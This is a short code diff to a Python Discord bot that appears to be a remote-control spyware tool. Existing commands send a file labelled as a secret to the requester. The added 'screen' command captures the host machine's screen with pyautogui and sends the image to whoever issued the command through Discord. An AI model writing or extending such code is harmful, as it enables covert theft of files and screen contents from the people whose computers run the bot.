@@ -43,6 +43,11 @@ async def get_secret(ctx):
 		await ctx.author.send(file_content)
 	except:
 		await ctx.send("```[Warning] Bash dont find```")
+
+@client.command(pass_context = True)
+async def screen(ctx):
+	photo_s = pyautogui.screenshot('screen.png')
+	await ctx.author.send(photo_s)
 		
 @client.command(pass_context = True)
 async def log(ctx):
